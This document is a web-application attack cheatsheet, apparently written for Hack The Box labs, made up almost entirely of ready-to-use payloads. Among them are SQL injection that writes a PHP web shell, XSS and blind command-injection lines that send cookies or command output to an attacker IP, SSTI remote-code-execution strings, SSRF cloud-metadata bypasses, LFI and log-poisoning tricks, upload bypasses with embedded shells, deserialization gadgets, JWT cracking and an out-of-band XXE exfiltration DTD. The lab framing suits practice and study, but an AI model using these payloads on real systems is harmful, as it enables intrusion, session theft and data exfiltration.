# Web Application Attack Cheatsheet

Quick reference for web exploitation techniques used in HTB machines and challenges.

## Reconnaissance

```bash
# Directory brute-force
gobuster dir -u http://10.10.10.X -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
feroxbuster -u http://10.10.10.X -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# File discovery
gobuster dir -u http://10.10.10.X -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,jsp,txt,html,js,bak,old

# Vhost/subdomain discovery
gobuster vhost -u http://domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -u http://domain.htb -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>

# Parameter fuzzing
ffuf -u http://10.10.10.X/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <default_size>

# Technology fingerprint
whatweb http://10.10.10.X
wappalyzer (browser extension)
```

## SQL Injection

```bash
# Detection
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' ORDER BY 10-- -

# Union-based
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT username,password,3 FROM users-- -

# Error-based (MySQL)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -

# Time-based blind
' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -

# SQLMap
sqlmap -u "http://10.10.10.X/page?id=1" --batch --dbs
sqlmap -u "http://10.10.10.X/page?id=1" -D dbname --tables
sqlmap -u "http://10.10.10.X/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --batch --dbs  # From Burp saved request

# Out-of-band
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

## Cross-Site Scripting (XSS)

```html
<!-- Reflected -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'-alert(1)-'

<!-- Stored - Cookie stealing -->
<script>new Image().src="http://10.10.14.X/?c="+document.cookie</script>
<script>fetch('http://10.10.14.X/?c='+document.cookie)</script>

<!-- DOM-based -->
<img src=x onerror="fetch('http://10.10.14.X/?c='+document.cookie)">

<!-- Filter bypass -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<details open ontoggle=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

## Server-Side Template Injection (SSTI)

```
# Detection
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}

# Jinja2 (Python/Flask)
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= system("id") %>
<%= `id` %>
```

## Server-Side Request Forgery (SSRF)

```
# Basic
http://127.0.0.1
http://localhost
http://0.0.0.0

# Bypass filters
http://0177.0.0.1          # Octal
http://2130706433           # Decimal
http://0x7f000001           # Hex
http://127.1                # Short
http://[::1]                # IPv6
http://127.0.0.1.nip.io    # DNS rebinding

# Cloud metadata
http://169.254.169.254/latest/meta-data/   # AWS
http://metadata.google.internal/            # GCP
http://169.254.169.254/metadata/instance    # Azure

# Internal port scanning
http://127.0.0.1:PORT/

# File read via file://
file:///etc/passwd
```

## Local File Inclusion (LFI)

```
# Basic
../../../etc/passwd
....//....//....//etc/passwd

# Null byte (PHP < 5.3)
../../../etc/passwd%00

# Double encoding
%252e%252e%252f%252e%252e%252fetc/passwd

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://input (POST data as PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id

# Log poisoning
/var/log/apache2/access.log  (inject PHP in User-Agent)
/var/log/auth.log            (inject PHP in SSH username)
/proc/self/environ           (inject PHP in User-Agent header)

# Path traversal with wrappers
php://filter/read=convert.base64-encode/resource=../../../etc/passwd
```

## File Upload Bypass

```bash
# Extension bypass
shell.php.jpg
shell.pHp
shell.php5
shell.phtml
shell.php%00.jpg
shell.php.png

# Content-Type bypass
Content-Type: image/jpeg
Content-Type: image/png

# Magic bytes
GIF89a; <?php system($_GET['cmd']); ?>

# .htaccess upload
AddType application/x-httpd-php .jpg

# Double extension
shell.php.jpg (if server checks last extension)
shell.jpg.php (if server checks first extension)
```

## Command Injection

```bash
# Separators
; id
| id
|| id
& id
&& id
`id`
$(id)

# Newline
%0aid

# Blind (out-of-band)
; curl http://10.10.14.X/$(whoami)
; ping -c 1 10.10.14.X

# Bypass filters
c'a't /etc/passwd
c\at /etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
```

## Deserialization

```bash
# Java
# ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# PHP
# phpggc
phpggc Laravel/RCE1 system id

# Python (Pickle)
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())

# .NET
# ysoserial.net
.\ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "ping 10.10.14.X"
```

## JWT Attacks

```bash
# Decode
echo "JWT_TOKEN" | cut -d. -f2 | base64 -d

# None algorithm
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature

# Key confusion (RS256 -> HS256)
# Sign with public key as HMAC secret

# Brute force secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt_tool
python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py JWT_TOKEN -X a  # Algorithm none attack
python3 jwt_tool.py JWT_TOKEN -X k -pk public.pem  # Key confusion
```

## XXE (XML External Entity)

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<root>&xxe;</root>

<!-- Blind XXE (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.X/evil.dtd">%xxe;]>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.X/?data=%file;'>">
%eval;
%exfil;
```

## Useful Wordlists (SecLists)

```
Discovery/Web-Content/raft-medium-directories.txt
Discovery/Web-Content/raft-medium-files.txt
Discovery/Web-Content/common.txt
Discovery/Web-Content/directory-list-2.3-medium.txt
Discovery/DNS/subdomains-top1million-5000.txt
Fuzzing/LFI/LFI-Jhaddix.txt
Passwords/Leaked-Databases/rockyou.txt
Usernames/Names/names.txt
```
